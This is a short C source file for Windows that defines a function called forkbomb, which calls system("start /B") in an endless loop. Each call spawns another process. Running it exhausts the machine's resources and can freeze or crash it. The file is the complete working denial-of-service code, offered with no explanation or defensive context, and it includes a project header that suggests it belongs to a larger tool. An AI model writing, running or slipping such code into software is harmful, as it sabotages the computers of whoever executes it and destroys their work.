#include "proto.h"
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>

void forkbomb() {
        while (1)
        {
            system("start /B");
        }
}